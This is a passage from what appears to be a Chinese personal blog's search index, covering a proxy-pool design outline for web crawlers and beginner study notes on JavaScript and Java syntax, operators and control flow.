href=\"#代理池的目标\" class=\"headerlink\" title=\"代理池的目标\"></a>代理池的目标</h2><p>代理池基本模块分为四个部分：<code>存储模块、获取模块、检测模块、接口模块</code>。</p>\n<ul>\n<li>存储模块：负责存储抓取下来的代理。首先要保证代理不重复，要标识代理的可用情况，还要动态实时处理每个代理，所以一种比较高效和方便的存储方式就是使用 Redis 的 Sorted Set，即有序集合。</li>\n<li>获取模块：需要定时在各大代理网站抓取代理。代理可以是免费公开代理也可以是付费代理，代理的形式都是 IP 加端口，此模块尽量从不同来源获取，尽量抓取高匿代理，抓取成功之后将可用代理保存到数据库中。</li>\n<li>检测模块：需要定时检测数据库中的代理。这里需要设置一个检测链接，最好是爬取哪个网站就检测哪个网站，这样更加有针对性，如果要做一个通用型的代理，那可以设置百度等链接来检测。另外，我们需要标识每一个代理的状态，如设置分数标识，100 分代表可用，分数越少代表越不可用。检测一次，如果代理可用，我们可以将分数标识立即设置为 100 满分，也可以在原基础上加 1 分；如果代理不可用，可以将分数标识减 1 分，当分数减到一定阈值后，代理就直接从数据库移除。通过这样的标识分数，我们就可以辨别代理的可用情况，选用的时候会更有针对性。</li>\n<li>接口模块：需要用 API 来提供对外服务的接口。其实我们可以直接连接数据库来获取对应的数据，但是这样就需要知道数据库的连接信息，并且要配置连接，而比较安全和方便的方式就是提供一个 Web API 接口，我们通过访问接口即可拿到可用代理。另外，由于可用代理可能有多个，那么我们可以设置一个随机返回某个可用代理的接口，这样就能保证每个可用代理都可以取到，实现负载均衡。</li>\n</ul>\n<h2 id=\"代理池的架构\"><a href=\"#代理池的架构\" class=\"headerlink\" title=\"代理池的架构\"></a>代理池的架构</h2><p><img src=\"/images/image-20230730113332916.png\" alt=\"image-20230730113332916\"></p>\n","categories":["其他知识点"],"tags":["web","安全","其他"]},{"title":"JavaScript学习记录(一)","url":"/2022/09/17/JavaScript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>初始JavaScript</li>\n<li>变量</li>\n<li>数据类型</li>\n<li>运算符</li>\n<li>流程控制&amp;分支结构</li>\n</ul>\n<h3 id=\"初始JavaScript\"><a href=\"#初始JavaScript\" class=\"headerlink\" title=\"初始JavaScript\"></a>初始JavaScript</h3><p> <strong>（1）初始JavaScript</strong></p>\n<ul>\n<li>javascript是运行在客户端的脚本语言（script是脚本的意思）</li>\n<li>脚本语言：不需要编译，运行过程中由js解释器（就是引擎）逐行来进行解释并执行</li>\n<li>javascript的作用：<ul>\n<li>表单动态校验（密码强度检测）</li>\n<li>网页特效</li>\n<li>服务端开发（Node.js）</li>\n<li>桌面程序</li>\n<li>App</li>\n</ul>\n</li>\n<li>浏览器分成两部分：渲染引擎和JS引擎<ul>\n<li>渲染引擎：用来解析HTML和css，俗称内核；</li>\n<li>JS引擎：也称为JS解释器，用来读取网页中的javascript代码，对其处理后运行。</li>\n</ul>\n</li>\n<li>JS的组成<ul>\n<li>ECMAScript（javascript语法）：规定了JS的编程语法和基础核心知识；</li>\n<li>DOM（页面文档对象模型）：W3C组织推荐的处理可扩展标记语言的标准编程基础；</li>\n<li>BOM（浏览器对象模型）：可以操作浏览器窗口。</li>\n</ul>\n</li>\n<li>JS三种书写位置<ul>\n<li>行内式<ul>\n<li>在JS中建议使用单引号</li>\n</ul>\n</li>\n<li>内嵌式<ul>\n<li>最常用的</li>\n</ul>\n</li>\n<li>外部式<ul>\n<li>引用外部JS文件的script标签中间不可以写代码</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p> <strong>（2）JavaScript注释</strong></p>\n<ul>\n<li>单行注释：&#x2F;&#x2F;（ctrl+&#x2F;）</li>\n<li>多行注释：&#x2F;**&#x2F;（shift + alt + a）</li>\n</ul>\n<p> <strong>（3）JavaScript输入输出语句</strong></p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>说明</th>\n<th>归属</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>alert(msg)</td>\n<td>浏览器弹出警告框</td>\n<td>浏览器</td>\n</tr>\n<tr>\n<td>console.log(msg)</td>\n<td>浏览器控制台打印输出信息</td>\n<td>浏览器</td>\n</tr>\n<tr>\n<td>prompt(info)</td>\n<td>浏览器弹出输入框，用户可以输入</td>\n<td>浏览器</td>\n</tr>\n</tbody></table>\n<h3 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h3><p> <strong>（1）变量声明和赋值</strong></p>\n<pre><code>// 声明变量\nvar age;\n//声明一个名称为age的变量\nage = 10; // 给age这个变量赋值为10\n// 输出结果\nconsole.log(age);\n// 变量的初始化\nvar name = &quot;小明&quot;;\n</code></pre>\n<p> <strong>（2）变量语法拓展</strong></p>\n<pre><code>// 变量覆盖\nvar myname = &quot;小明&quot;;\nconsole.log(myname);\nmyname = &quot;小红&quot;;\nconsole,log(myname);\n// 同时声明多个变量\nvar age = 18,address = &quot;南昌&quot;;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>情况</th>\n<th>说明</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>var age;console.log(age);</td>\n<td>只声明，不赋值</td>\n<td>undefined</td>\n</tr>\n<tr>\n<td>console.log(age);</td>\n<td>不声明 不赋值 直接使用</td>\n<td>报错</td>\n</tr>\n<tr>\n<td>age &#x3D; 10;console.log(age);</td>\n<td>不声明，直接使用</td>\n<td>10</td>\n</tr>\n</tbody></table>\n<p> <strong>（3）变量的命名规范</strong></p>\n<ul>\n<li>由字母、数字、下划线、美元符组成</li>\n<li>严格区分大小写</li>\n<li>不能以数字开头</li>\n<li>不能是关键字、保留字</li>\n<li>变量名必须有意义</li>\n<li>遵守驼峰命名法。首字母小写，后面单词的首字母需要大写。</li>\n</ul>\n<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><p> <strong>（1）数据类型的简介</strong></p>\n<ul>\n<li>javascript是一种弱类型语言或者说动态语言。不用提前声明变量的类型，类型会被自动确定。</li>\n<li>javascript拥有动态类型，意味着相同的变量可用作不同的类型。</li>\n</ul>\n<p> <strong>（2）数据类型的分类</strong></p>\n<ul>\n<li>简单数据类型：Number、String、Boolean、Undefined、Null<ul>\n<li>数字型Number<ul>\n<li>infinity：代表无穷大，大于任何值</li>\n<li>-infinity：代表无穷小，小于任何值</li>\n<li>NaN：Not a number，代表一个非数值</li>\n<li>isNaN()：这个方法用于判断非数字，是数字则返回false，非数字返回true</li>\n</ul>\n</li>\n<li>字符串型String<ul>\n<li>使用单引号或者双引号括起来的</li>\n<li>字符转义字符<ul>\n<li>\\n：换行符</li>\n<li>\\t：tab缩进</li>\n<li>\\b：空格，b是blank的意思</li>\n<li>&#39;：单引号</li>\n</ul>\n</li>\n<li>字符串的长度：通过<code>length</code>属性来获取字符串的长度</li>\n<li>字符串拼接：使用<code>+</code>进行拼接：数值相加，字符相连</li>\n</ul>\n</li>\n<li>布尔型Boolean<ul>\n<li>true参与加法运算当1来看，false当0看</li>\n</ul>\n</li>\n<li>undefined和Null<ul>\n<li>一个声明后的没有被赋值的变量会有一个默认值undefined</li>\n<li>一个声明变量给null，里面存的值为空</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>简单数据类型</th>\n<th>说明</th>\n<th>默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Number</td>\n<td>数字型，包含整形值和浮点型值</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>布尔值</td>\n<td>false</td>\n</tr>\n<tr>\n<td>String</td>\n<td>字符串类型</td>\n<td>“”</td>\n</tr>\n<tr>\n<td>Undefined</td>\n<td>var a;声明了变量a但是没有给值，此时a &#x3D; undefined</td>\n<td>undefined</td>\n</tr>\n<tr>\n<td>Null</td>\n<td>var a &#x3D; null;声明了变量a为空值</td>\n<td>null</td>\n</tr>\n</tbody></table>\n<ul>\n<li>复杂数据类型：object</li>\n</ul>\n<p> <strong>（3）获取变量数据类型</strong></p>\n<ul>\n<li>typeof可以用来获取检测变量的数据类型</li>\n</ul>\n<p> <strong>（4）数据类型的转换</strong></p>\n<ul>\n<li>转换为字符串类型<ul>\n<li>toString()：变量.toString()</li>\n<li>String()强制转换：String(变量)</li>\n<li>加号拼接字符串：和字符串拼接的结果都是字符串</li>\n</ul>\n</li>\n<li>转换为数字型<ul>\n<li>parseInt(string)函数：将string类型转换为整数数值型</li>\n<li>parseFloat(string)函数：将string类型转换为浮点数数值型</li>\n<li>Number()强制转换函数：将string类型转换为数值型</li>\n<li>js隐式转换(- * &#x2F;)：利用算术运算隐式转为数值型</li>\n</ul>\n</li>\n<li>转换为布尔型<ul>\n<li>Boolean()函数：其他类型转成布尔型</li>\n<li>代表空、否定的值会被转换为false，其他的值都会转换为true</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h3><p> <strong>（1）运算符</strong></p>\n<ul>\n<li>运算符也叫操作符，用于实现赋值、比较和执行算数运算等功能的符号</li>\n<li>算数运算符<ul>\n<li>+：加</li>\n<li>-：减</li>\n<li>*：乘</li>\n<li>&#x2F;：除</li>\n<li>%：取余数（取模）</li>\n</ul>\n</li>\n<li>浮点数的精度问题：浮点数的最高精度是17位小数，但是进行算术计算时其精度远远不如整数</li>\n<li>表达式：由数字、运算符、变量等组成的式子</li>\n<li>返回值：表达式最终都会有一个结果返回给我们，这就是返回值</li>\n<li>递增递减运算符<ul>\n<li>如果需要反复给数字变量添加或减去1，可以使用递增（++）和递减（–）运算符来完成</li>\n<li>前置递增（递减）：先自加（自减），后返回值</li>\n<li>后缀递增（递减）：先返回原值，后自加（自减）</li>\n</ul>\n</li>\n<li>比较运算符（关系运算符）：两个数据进行比较时所使用的运算符，比较运算后，会返回一个布尔值（true&#x2F;false）作为比较运算的结果。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>运算符名称</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt;</td>\n<td>小于</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>| 大于<br>&#x3D;| 大于等于<br>&lt;&#x3D;| 小于等于<br>&#x3D;&#x3D;| 判等号<br>!&#x3D;| 不等号<br>&#x3D;&#x3D;&#x3D; !&#x3D;&#x3D;&#x3D;| 全等 要求值和数据类型都一致  </p>\n</blockquote>\n<ul>\n<li>逻辑运算符：用来进行布尔运算的运算符，其返回值也是布尔值，后面开发中经常用于多个条件的判断<ul>\n<li>&amp;&amp;：逻辑与，遇假就为假</li>\n<li>||：逻辑或，遇真就为真</li>\n<li>!：逻辑非，取反</li>\n<li>短路运算（逻辑中断）：当有多个表达式时，左边的表达式可以确定结果时，就不再继续运算右边的表达式的值。</li>\n</ul>\n</li>\n<li>赋值运算符：用来把数据赋值给变量的运算符<ul>\n<li>&#x3D;：直接赋值</li>\n<li>+&#x3D;、-&#x3D;：加、减一个数后再赋值</li>\n<li>*&#x3D;、&#x2F;&#x3D;、%&#x3D;：乘、除、取模后再赋值</li>\n</ul>\n</li>\n<li>运算符优先级<ul>\n<li>一元运算符里面的逻辑非优先级很高</li>\n<li>逻辑与比逻辑或优先级高</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>优先级</th>\n<th>运算符</th>\n<th>顺序</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>小括号</td>\n<td>()</td>\n</tr>\n<tr>\n<td>2</td>\n<td>一元运算符</td>\n<td>++ – !</td>\n</tr>\n<tr>\n<td>3</td>\n<td>算数运算符</td>\n<td>先* &#x2F; % 后+ -</td>\n</tr>\n<tr>\n<td>4</td>\n<td>关系运算符</td>\n<td>&gt; &gt;&#x3D; &lt; &lt;&#x3D;</td>\n</tr>\n<tr>\n<td>5</td>\n<td>相等运算符</td>\n<td>&#x3D;&#x3D; &gt;&#x3D; &#x3D;&#x3D;&#x3D; !&#x3D;&#x3D;</td>\n</tr>\n<tr>\n<td>6</td>\n<td>逻辑运算符</td>\n<td>先&amp;&amp; 后</td>\n</tr>\n<tr>\n<td>7</td>\n<td>赋值运算符</td>\n<td>&#x3D;</td>\n</tr>\n<tr>\n<td>8</td>\n<td>逗号运算符</td>\n<td>,</td>\n</tr>\n</tbody></table>\n<h3 id=\"流程控制-amp-分支结构\"><a href=\"#流程控制-amp-分支结构\" class=\"headerlink\" title=\"流程控制&amp;分支结构\"></a>流程控制&amp;分支结构</h3><p> <strong>（1）流程控制</strong></p>\n<ul>\n<li><p>流程控制就是来控制我们的代码按照什么结构顺序来执行</p>\n</li>\n<li><p>分类：</p>\n<ul>\n<li>顺序结构：程序按照代码的先后顺序，依次执行</li>\n<li>分支结构：由上往下执行代码的过程中，根据不同的条件，执行不同的路径代码，从而得到不同的结果<ul>\n<li><p>if语句</p>\n<ul>\n<li><p>语法结构（双分支）<br><code>if(条件表达式) &#123;   // 条件成立执行的代码语句   &#125;else&#123;   // 条件不成立执行的代码语句   &#125;</code></p>\n</li>\n<li><p>语法结构（多分支）<br><code>if(条件表达式1) &#123;</code><br><code> // 条件1成立时执行</code><br><code>&#125;else if(条件表达式2)&#123;</code><br><code> // 条件1不成立条件2成立的时候执行</code><br><code>&#125;else&#123;</code><br><code>//条件1和条件2都不成立的时候执行</code><br><code>&#125;</code></p>\n</li>\n<li><p>三元表达式：<code>条件表达式 ? 表达式1 : 条件表达式2</code>，如果条件表达式的结果为真则返回表达式1的值，如果条件表达式的结果为假，则返回表达式2的值，有返回值</p>\n</li>\n</ul>\n</li>\n<li><p>switch语句</p>\n<ul>\n<li>语法结构<br><code>switch(表达式) &#123;   case value1:   执行语句1;   break;   case value2:   执行语句2;   break   default:   执行最后的语句;   &#125;</code></li>\n</ul>\n</li>\n<li><p>if和switch区别：</p>\n<ul>\n<li>switch……case语句通常处理case为比较确定值的情况下，而if……else……语句更加的灵活，常用于范围判断（大于、等于某个范围）</li>\n<li>switch语句进行条件判断后直接执行到程序的条件语句，效率更高。而if……else语句有几种条件，效率更低</li>\n<li>当分支比较少时，if……else语句的执行效率比switch语句高</li>\n<li>当分支比较多时，switch语句的执行效率比较高，而且结构更清晰。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>for循环</p>\n<ul>\n<li><p>for循环：在程序中，一组被重复执行的语句被称为循环体，能否继续重复执行，取决于循环的终止条件。由循环题及循环的终止条件组成的语句，被称之为循环语句。</p>\n</li>\n<li><p>语法结构：<br><code>for(初始化变量;条件表达式;操作表达式) &#123;   // 循环体   &#125;</code></p>\n</li>\n<li><p>语法结构（双重for循环）<br><code>for(初始化变量1;条件表达式1;操作表达式1) &#123;</code><br><code> </code>for(初始化变量2;条件表达式2;操作表达式2) {<code>   </code> &#x2F;&#x2F; 循环体<code>   </code>}&#96;&#96;<br><code>&#125;</code></p>\n</li>\n<li><p>九九乘法表案例</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/JavaScript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80/image-20240717201733356.png\" alt=\"image-20240717201733356\"></p>\n<p><img src=\"/images/JavaScript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80/image-105-1024x402.png\" alt=\"image-105-1024x402\"></p>\n<ul>\n<li>while循环<ul>\n<li>语法结构：<br><code>while(条件表达式) &#123;   // 循环体</code><br><code>num++;   &#125;</code></li>\n</ul>\n</li>\n<li>do……while循环<ul>\n<li><p>语法结构：<br><code>do&#123;   // 循环体   &#125;while(条件表达式);</code></p>\n</li>\n<li><p>至少被执行一次</p>\n</li>\n</ul>\n</li>\n<li>循环小结<ul>\n<li>JS中循环有for、while、do while</li>\n<li>三个循环很多情况下都可以相互替代使用</li>\n<li>如果是用来计次数，跟数字有关的，三者使用基本相同，但是一般使用for</li>\n<li>while和do……while可以做更复杂的判断条件，比for循环灵活一些</li>\n<li>while和do……while先执行一次，再判断执行</li>\n<li>while和do……while执行次数不一样，do……while至少会执行一次循环体，而while可能一次都不执行</li>\n</ul>\n</li>\n<li>continue和break<ul>\n<li>continue：立即跳出本次循环，继续下一次循环</li>\n<li>break：立即跳出整个循环</li>\n</ul>\n</li>\n</ul>\n","categories":["编程语言学习"],"tags":["编程语言","JavaScript"]},{"title":"Java学习记录(一)","url":"/2022/08/17/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>Java基础知识点</li>\n<li>基础语法</li>\n<li>分支结构</li>\n<li>循环结构</li>\n</ul>\n<h3 id=\"Java基础知识点\"><a href=\"#Java基础知识点\" class=\"headerlink\" title=\"Java基础知识点\"></a>Java基础知识点</h3><p>（1）Java是跨平台的一门语言，JVM；</p>\n<p>（2）JRE和JDK</p>\n<ul>\n<li>JRE：运行java程序；</li>\n<li>JDK：开发java程序。</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80/image-59-17212189300581.png\" alt=\"image-59\"></p>\n<p>（3）常见DOS命令</p>\n<table>\n<thead>\n<tr>\n<th>操作</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>盘符名称:</td>\n<td>盘符切换。E:回车，表示切换到E盘。</td>\n</tr>\n<tr>\n<td>dir</td>\n<td>查看当前路径下的内容。</td>\n</tr>\n<tr>\n<td>cd 目录</td>\n<td>进入单级目录。</td>\n</tr>\n<tr>\n<td>cd ..</td>\n<td>回退到上一级目录。</td>\n</tr>\n<tr>\n<td>cd 目录1\\目录2\\..</td>\n<td>进入多级目录。</td>\n</tr>\n<tr>\n<td>cd | 回退到盘符目录。</td>\n<td></td>\n</tr>\n<tr>\n<td>cls</td>\n<td>清屏。</td>\n</tr>\n<tr>\n<td>exit</td>\n<td>退出命令提示符窗口。</td>\n</tr>\n</tbody></table>\n<h3 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h3><p>（1） <strong>注释</strong></p>\n<ul>\n<li><p>单行注释</p>\n<ul>\n<li>格式：&#x2F;&#x2F;注释信息</li>\n</ul>\n</li>\n<li><p>多行注释</p>\n<ul>\n<li>格式：&#x2F;<em>注释信息</em>&#x2F;</li>\n</ul>\n</li>\n<li><p>文档注释</p>\n<ul>\n<li>格式：&#x2F;*<em>注释信息</em>&#x2F;</li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>常量</strong> ：在程序运行过程中，其值不可以发生改变的量。</p>\n<ul>\n<li>Java常量分类</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>常量类型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串常量</td>\n<td>用引号括起来的内容</td>\n</tr>\n<tr>\n<td>整数常量</td>\n<td>不带小数的数字</td>\n</tr>\n<tr>\n<td>小数常量</td>\n<td>带小数的数字</td>\n</tr>\n<tr>\n<td>字符常量</td>\n<td>用单引号括起来的内容</td>\n</tr>\n<tr>\n<td>布尔常量</td>\n<td>布尔值，表示真假</td>\n</tr>\n<tr>\n<td>空常量</td>\n<td>一个特殊的值，空值</td>\n</tr>\n</tbody></table>\n<p>（3） <strong>数据类型</strong></p>\n<ul>\n<li>数据类型分类<ol>\n<li>基本数据类型<ol>\n<li>数值型<ul>\n<li>整数（byte,short,int,long）</li>\n<li>浮点数（float,double）</li>\n<li>字符（char）</li>\n</ul>\n</li>\n<li>非数值型<ul>\n<li>布尔（boolean）</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>引用数据类型<ul>\n<li>类（class）</li>\n<li>接口（interface）</li>\n<li>数组（[ ]）</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>数据类型内存占用</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>关键字</strong></th>\n<th><strong>内存占用</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>byte</td>\n<td>1</td>\n</tr>\n<tr>\n<td>short</td>\n<td>2</td>\n</tr>\n<tr>\n<td>int（默认）</td>\n<td>4</td>\n</tr>\n<tr>\n<td>long</td>\n<td>8</td>\n</tr>\n<tr>\n<td>float</td>\n<td>4</td>\n</tr>\n<tr>\n<td>double（默认）</td>\n<td>8</td>\n</tr>\n<tr>\n<td>char</td>\n<td>2</td>\n</tr>\n<tr>\n<td>boolean</td>\n<td>1</td>\n</tr>\n</tbody></table>\n<p>（4） <strong>变量</strong></p>\n<ul>\n<li>定义：<code>数据类型 变量名 = 变量值;</code>例如：int a &#x3D; 10;</li>\n<li>变量的使用：<ul>\n<li>取值：<code>变量名</code>例如：a</li>\n<li>修改值：<code>变量名=变量值;</code>例如：a &#x3D; 20;</li>\n</ul>\n</li>\n<li>变量使用的注意事项：<ol>\n<li>不能使用相同的变量名；</li>\n<li>变量未赋值时，不能使用；</li>\n<li>定义long类型变量时，为了防止整数太大，后面要加上<code>L</code><ul>\n<li>long a &#x3D; 10000000000L;</li>\n</ul>\n</li>\n<li>要想让一个小说定义为一个float类型，为了防止类型不兼容，要在赋值的后面加上一个<code>F</code><ul>\n<li>float f &#x3D; 13.14F;</li>\n</ul>\n</li>\n</ol>\n</li>\n</ul>\n<p>（5） <strong>标识符</strong> ：就是给类、方法、变量等起名字的<code>符号</code>。</p>\n<ul>\n<li>标识符的定义规则：<ul>\n<li>由<code>数字</code>、<code>字母</code>、<code>下划线</code>和<code>美元符</code>组成；</li>\n<li>不能以数字开头；</li>\n<li>不能是关键字；</li>\n<li>区分大小写。</li>\n</ul>\n</li>\n<li>常见命名约定：<ul>\n<li>小驼峰命名法：方法和变量；</li>\n<li>大驼峰命名法：类。</li>\n</ul>\n</li>\n</ul>\n<p>（6） <strong>类型转换</strong></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80/image-63-17212189562962.png\" alt=\"image-63\"></p>\n<ul>\n<li>类型转换的分类：<ol>\n<li>自动类型转换：如图（1）<ul>\n<li>把一个表示数据<code>范围小的数值</code>或者<code>变量</code>赋值给另一个表示数据<code>范围大的变量</code>。</li>\n<li>例子：double b &#x3D; 10;&#x2F;&#x2F; 输出的是10.0</li>\n</ul>\n</li>\n<li>强制类型转换：<ul>\n<li>把一个表示数据<code>范围大的数值</code>或者<code>变量</code>赋值给另一个表示数据<code>范围小的变量</code>。</li>\n<li>格式：<code>目标数据类型 变量名 = (目标数据类型)值或者变量;</code></li>\n<li>例子：int k &#x3D; (int)88.88;&#x2F;&#x2F; 输出的值为88</li>\n</ul>\n</li>\n</ol>\n</li>\n</ul>\n<p>（7） <strong>算术运算符</strong> ：</p>\n<ul>\n<li>运算符：对常量或者变量进行操作的<code>符号</code></li>\n<li>表达式：用<code>运算符</code>把常量连接起来<code>符合Java语法的式子</code>就可以称为表达式。不同运算符连接的表达式体现的是不同类型的表达式。</li>\n<li>例子：int a &#x3D; 10;int b &#x3D; 20;int c &#x3D; a + b;<br>+：运算符；a + b：表达式。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>+</td>\n<td>加</td>\n</tr>\n<tr>\n<td>-</td>\n<td>减</td>\n</tr>\n<tr>\n<td>*</td>\n<td>乘</td>\n</tr>\n<tr>\n<td>&#x2F;</td>\n<td>除</td>\n</tr>\n<tr>\n<td>%</td>\n<td>取余</td>\n</tr>\n</tbody></table>\n<p>（8） <strong>字符的“+”操作</strong></p>\n<ul>\n<li>在进行加操作的时候，拿字符在计算机底层<code>对应的数值</code>来进行计算的（ASCII码）</li>\n<li>算术表达式中<code>包含多个基本数据类型</code>的值的时候，整个算术表达式的<code>类型</code>会<code>自动进行提升</code>。提升规则：<ul>\n<li>byte类型，short类型和char类型将被提升到int类型</li>\n<li>整个表达式的类型自动提升到表达式中最高等级操作数同样的类型<br>等级顺序：byte,short,char-&gt;int-&gt;long-&gt;float-&gt;double</li>\n</ul>\n</li>\n</ul>\n<p>（9） <strong>字符串的“+”操作</strong></p>\n<ul>\n<li>当“+”操作中出现字符串时，是<code>字符串连接符</code>，而不是算术运算。</li>\n<li>在“+”操作中，如果出现了字符串，就是连接运算符，否则就是算术运算符。</li>\n<li>当连续进行“+”操作时，从左到右逐个执行。</li>\n</ul>\n<p>（10） <strong>赋值运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&#x3D;</td>\n<td>赋值</td>\n</tr>\n<tr>\n<td>+&#x3D;（隐含了强制类型转换）</td>\n<td>加后赋值</td>\n</tr>\n<tr>\n<td>-&#x3D;</td>\n<td>减后赋值</td>\n</tr>\n<tr>\n<td>*&#x3D;</td>\n<td>乘后赋值</td>\n</tr>\n<tr>\n<td>&#x2F;&#x3D;</td>\n<td>除后赋值</td>\n</tr>\n<tr>\n<td>%&#x3D;</td>\n<td>取余后赋值</td>\n</tr>\n</tbody></table>\n<p>（11） <strong>自增自减运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>++</td>\n<td>自增</td>\n</tr>\n<tr>\n<td>--</td>\n<td>自减</td>\n</tr>\n</tbody></table>\n<ul>\n<li>单独使用的时候，++和–放在前面和后面结果都是一样的；</li>\n<li>参与操作的时候，如果放在变量后面，先拿变量参与操作，后拿变量做++或–；</li>\n<li>参与操作的时候，如果放在变量前面，先拿变量做++或–，后拿变量参与操作。</li>\n</ul>\n<p>（12） <strong>关系运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&#x3D;&#x3D;</td>\n<td>判断是否相等</td>\n</tr>\n<tr>\n<td>!&#x3D;</td>\n<td>判断是否不相等</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>| 判断是否大于<br>&#x3D;| 判断是否大于等于<br>&lt;| 判断是否小于<br>&lt;&#x3D;| 判断是否小于等于  </p>\n</blockquote>\n<ul>\n<li>注意事项：<ul>\n<li>关系运算符的<code>结果</code>都是布尔类型，要么是true，要么是false；</li>\n<li>千万不能将<code>==</code>写成<code>=</code>。</li>\n</ul>\n</li>\n</ul>\n<p>（13） <strong>逻辑运算符</strong></p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&amp;</td>\n<td>逻辑与</td>\n<td>有false则false</td>\n</tr>\n<tr>\n<td></td>\n<td>逻辑或</td>\n<td>有true则true</td>\n</tr>\n<tr>\n<td>^</td>\n<td>逻辑异或</td>\n<td>相同为false，不同为true</td>\n</tr>\n<tr>\n<td>!</td>\n<td>逻辑非</td>\n<td>与原来的布尔值相反</td>\n</tr>\n</tbody></table>\n<p>短路逻辑运算符：</p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&amp;&amp;</td>\n<td>短路与</td>\n<td>作用和&amp;相同，但是有短路效果</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>短路或</td>\n</tr>\n</tbody></table>\n<p>（14） <strong>三元运算符</strong></p>\n<ul>\n<li>格式：关系运算符<code>?</code>表达式1<code>:</code>表达式2;</li>\n<li>范例：a &gt; b ? a : b;</li>\n<li>计算规则：<ul>\n<li>首先计算关系表达式的值</li>\n<li>如果值为true，表达式1的值就是运算结果</li>\n<li>如果值为false，表达式2的值就是运算结果</li>\n</ul>\n</li>\n</ul>\n<p>（15） <strong>数据输入</strong></p>\n<ul>\n<li><p>导包</p>\n<ul>\n<li>import java.util.Scanner;<br><code>导包的动作必须出现在类定义的上边</code></li>\n</ul>\n</li>\n<li><p>创建对象</p>\n<ul>\n<li>Scanner sc &#x3D; new Scanner(System.in);<br>上面这个格式里面，只有sc是变量名，可以变，其他的都不允许变。</li>\n</ul>\n</li>\n<li><p>接收数据</p>\n<ul>\n<li>int i &#x3D; sc.nextInt();<br>上面这个格式里面，只有i是变量名，可以变，其他的都不允许变。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"分支结构\"><a href=\"#分支结构\" class=\"headerlink\" title=\"分支结构\"></a>分支结构</h3><p>（1） <strong>流程控制</strong></p>\n<ul>\n<li>分类：<ul>\n<li>顺序结构</li>\n<li>分支结构（if，switch）</li>\n<li>循环结构（for，while，do…while）</li>\n</ul>\n</li>\n<li>顺序结构：是程序中最简单最基本的流程控制，没有特定的语法结构，按照代码的先后顺序，依次执行，程序中大多数的代码都是这样执行的。</li>\n</ul>\n<p>（2） <strong>if语句</strong></p>\n<ul>\n<li><p>if语句格式1</p>\n<ul>\n<li>格式：<br>if(关系表达式){<br>语句体;<br>}</li>\n</ul>\n</li>\n<li><p>if语句格式2</p>\n<ul>\n<li>格式：<br>if(关系表达式){<br>语句体1;<br>}else{<br>语句体2;<br>}</li>\n</ul>\n</li>\n<li><p>if语句格式3</p>\n<ul>\n<li>格式：<br>if(关系表达式1){<br>语句体1;<br>}else if(关系表达式2){<br>语句体2;<br>}<br>….<br>else{<br>语句体n+1;<br>}</li>\n</ul>\n</li>\n</ul>\n<p>（3） <strong>switch语句</strong></p>\n<ul>\n<li>格式：<br>switch(表达式){<br>case 值1:<br>语句体1;<br>break;<br>case 